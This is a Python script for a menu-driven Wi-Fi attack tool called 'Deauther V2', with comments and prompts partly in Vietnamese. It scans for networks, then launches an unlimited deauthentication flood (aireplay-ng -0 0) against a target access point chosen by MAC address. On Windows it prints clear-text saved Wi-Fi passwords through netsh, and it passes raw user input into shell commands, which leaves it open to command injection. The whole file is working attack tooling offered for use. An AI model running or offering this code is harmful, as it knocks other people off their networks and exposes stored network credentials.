import os
import sys
import time

ASH = "\033[1;90m"
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
CYAN = "\033[1;96m"
WHITE = "\033[1;97m"

def typefx(text, speed=0.003):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def loading(text="Loading", dots=3, delay=0.25):
    for i in range(dots):
        sys.stdout.write(f"\r{text}{'.' * (i+1)}{' ' * (dots-i)}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear_screen()
    print(f"""
{ASH}@@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@
{ASH}@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@  @@@  @@@  @@@@@@@@  @@@@@@@@
{ASH}@@!  @@@  @@!       @@!  @@@  @@!  @@@    @@!    @@!  @@@  @@!       @@!  @@@
{ASH}!@!  @!@  !@!       !@!  @!@  !@!  @!@    !@!    !@!  @!@  !@!       !@!  @!@
{ASH}@!@  !@!  @!!!:!    @!@!@!@!  @!@  !@!    @!!    @!@!@!@!  @!!!:!    @!@!!@!
{ASH}!@!  !!!  !!!!!:    !!!@!!!!  !@!  !!!    !!!    !!!@!!!!  !!!!!:    !!@!@!
{ASH}!!:  !!!  !!:       !!:  !!!  !!:  !!!    !!:    !!:  !!!  !!:       !!: :!!
{ASH}:!:  !:!  :!:       :!:  !:!  :!:  !:!    :!:    :!:  !:!  :!:       :!:  !:!
{ASH}:::: ::   :: ::::   ::   :::  ::::: ::    :::    :::  :::  :: ::::   :::   :::
{ASH}:: : :    :: ::::   ::   : :   : :: ::     :      :   : :  : :: ::   ::     :::
{WHITE}                DEAUTHER V2 — BY JAILIDEA >_
    """)

def select_interface():
    typefx(f"{YELLOW}Scanning network interfaces...\n")
    if os.name == "nt":
        os.system("netsh wlan show interfaces")
        print("")
        iface = input(f"{CYAN}Enter your WiFi interface name (e.g., Wi-Fi) → {WHITE}")
    else:
        os.system("iwconfig")
        print("")
        iface = input(f"{CYAN}Enter your WiFi interface (e.g., wlan0, wlx*) → {WHITE}")
    return iface

def scan_network(iface):
    loading("Starting WiFi scanner")
    if os.name == "nt":
        typefx(f"{GREEN}Displaying available networks (SSID, BSSID, Signal, Channel):\n{WHITE}")
        os.system("netsh wlan show networks mode=bssid")
    else:
        typefx(f"{GREEN}Press CTRL + C when you see your target.\n")
        try:
            os.system(f"airodump-ng {iface}")
        except KeyboardInterrupt:
            typefx(f"\n{YELLOW}Scanner stopped. Proceeding to target selection.\n")

def deauth_attack(iface):
    if os.name == "nt":
        typefx(f"\n{RED}[!] LỖI TƯƠNG THÍCH WINDOWS:{WHITE}")
        typefx(f"{YELLOW}1. 'aireplay-ng' và 'airmon-ng' chỉ chạy trên Linux (Kali Linux, Parrot OS, Ubuntu...){WHITE}")
        typefx(f"{YELLOW}2. Driver Wi-Fi mặc định của Windows không hỗ trợ chế độ Monitor Mode và Packet Injection.{WHITE}")
        typefx(f"{CYAN}>> Để thực hiện Deauth attack thành công, bạn nên:{WHITE}")
        typefx(f"   - Dùng máy ảo VMware / VirtualBox cài Kali Linux kèm USB Wi-Fi hỗ trợ Monitor Mode (như AR9271, RTL8812AU).")
        typefx(f"   - Hoặc tạo USB Boot Kali Linux Live.\n")
        return

    target_mac = input(f"{RED}Enter Target MAC Address → {WHITE}")
    channel = input(f"{YELLOW}Channel (press Enter to skip) → {WHITE}")

    loading("Preparing deauth attack")

    if channel.strip() != "":
        os.system(f"airmon-ng stop {iface}")
        os.system(f"airmon-ng start {iface} {channel}")

    typefx(f"{RED}Starting deauth attack...{WHITE}")
    time.sleep(1)

    os.system(f"aireplay-ng -0 0 -a {target_mac} {iface}")

def show_saved_passwords():
    """Tính năng hữu ích cho Windows: xem mật khẩu WiFi đã lưu"""
    typefx(f"{YELLOW}Danh sách WiFi đã lưu trên máy Windows:\n{WHITE}")
    os.system("netsh wlan show profiles")
    profile = input(f"\n{CYAN}Nhập tên WiFi muốn xem mật khẩu (hoặc Enter để bỏ qua) → {WHITE}")
    if profile.strip():
        os.system(f'netsh wlan show profile name="{profile.strip()}" key=clear')

def menu():
    while True:
        banner()
        if os.name == "nt":
            print(f"""
{WHITE}[{GREEN}1{WHITE}] Scan WiFi Networks (BSSID, MAC, Channel)
{WHITE}[{GREEN}2{WHITE}] View Saved WiFi Passwords on Windows
{WHITE}[{YELLOW}3{WHITE}] Run Deauth Attack (Yêu cầu Linux / Kali Linux)
{WHITE}[{RED}0{WHITE}] Exit Program
            """)
        else:
            print(f"""
{WHITE}[{GREEN}1{WHITE}] Run Manual Deauth Attack
{WHITE}[{RED}0{WHITE}] Exit Program
            """)
        choice = input(f"{CYAN}Choose an option → {WHITE}")

        if choice == "1":
            banner()
            iface = select_interface()
            scan_network(iface)
            if os.name != "nt":
                deauth_attack(iface)
            input(f"\n{GREEN}Done. Press Enter to return to the menu...")
        elif choice == "2" and os.name == "nt":
            banner()
            show_saved_passwords()
            input(f"\n{GREEN}Done. Press Enter to return to the menu...")
        elif choice == "3" and os.name == "nt":
            banner()
            iface = select_interface()
            deauth_attack(iface)
            input(f"\n{GREEN}Done. Press Enter to return to the menu...")
        elif choice == "0":
            typefx(f"{RED}Exiting...", 0.01)
            loading("Goodbye")
            sys.exit()
        else:
            typefx(f"{RED}Invalid input. Try again.", 0.01)
            time.sleep(1)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Program terminated.{WHITE}")